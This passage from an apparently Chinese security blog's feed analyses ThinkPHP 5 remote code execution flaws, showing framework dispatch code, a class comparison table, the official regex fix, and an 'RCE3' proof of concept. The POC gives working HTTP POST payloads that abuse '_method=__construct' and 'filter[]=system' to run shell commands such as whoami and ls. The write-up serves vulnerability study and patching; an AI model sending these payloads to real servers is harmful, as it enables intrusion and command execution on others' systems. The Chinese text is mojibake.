class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æµ‹è·¯ç”±afterè¡Œä¸º</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•°æ®è‡ªåŠ¨éªŒè¯</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº†åå°„æœºåˆ¶ï¼Œè°ƒç”¨ç±»çš„æ–¹æ³•ï¼Œè¿™é‡Œç±»å’Œæ–¹æ³•éƒ½å¯æ§ã€‚</p><p>è¯¥æ–¹æ³•ä¸­ï¼Œ<strong>æœªå¯¹å®ä¾‹åŒ–æ§åˆ¶å™¨å’Œæ“ä½œåè¿›è¡Œä»»ä½•è¿‡æ»¤ã€åˆæ³•æ€§æ£€æµ‹æ“ä½œï¼Œè¿™å°±æ˜¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç›´æ¥åŸå› ã€‚</strong></p><hr><p>å¦‚æœç›´æ¥æ‹¿è¯¥ç‰ˆæœ¬çš„ <strong>payload</strong> å»æµ‹è¯• <strong>ThinkPHP5.0.x</strong> ç‰ˆæœ¬ï¼Œä¼šå‘ç°å¾ˆå¤š <strong>payload</strong> éƒ½ä¸èƒ½æˆåŠŸã€‚å…¶åŸå› æ˜¯ä¸¤ä¸ªå¤§ç‰ˆæœ¬å·²åŠ è½½çš„ç±»ä¸åŒï¼Œå¯¼è‡´å¯åˆ©ç”¨çš„ç±»ä¹Ÿä¸å°½ç›¸åŒã€‚å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>ä»£ç å±‚é¢ï¼šå¢åŠ å¯¹æ§åˆ¶å™¨åçš„åˆæ³•æ€§æ£€æŸ¥ã€‚</p><p>åº”æ€¥å±‚é¢ï¼šä¸´æ—¶å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå¢åŠ æ­£åˆ™è¡¨è¾¾å¼ <code>^[A-Za-z](\w)*$</code> ï¼Œå¯¹æ§åˆ¶å™¨åè¿›è¡Œåˆæ³•æ€§æ£€æµ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23ã€5.1.0 &lt;&#x3D; 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å’Œä¸Šä¸€ä¸ªRCEç›´æ¥åŸå› ä¸€æ ·ï¼Œéƒ½æ˜¯æ²¡æœ‰å¯¹æ§åˆ¶å™¨è¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒã€‚</p><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸»è¦å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶G</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>CSS æ³¨å…¥å­¦ä¹ ç¬”è®°</title>
    <link href="https://hack-for.fun/5dcc.html"/>
    <id>https://hack-for.fun/5dcc.html</id>
    <published>2020-09-22T12:30:30.000Z</published>
    <updated>2020-09-23T09:36:31.894Z</updated>
    
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
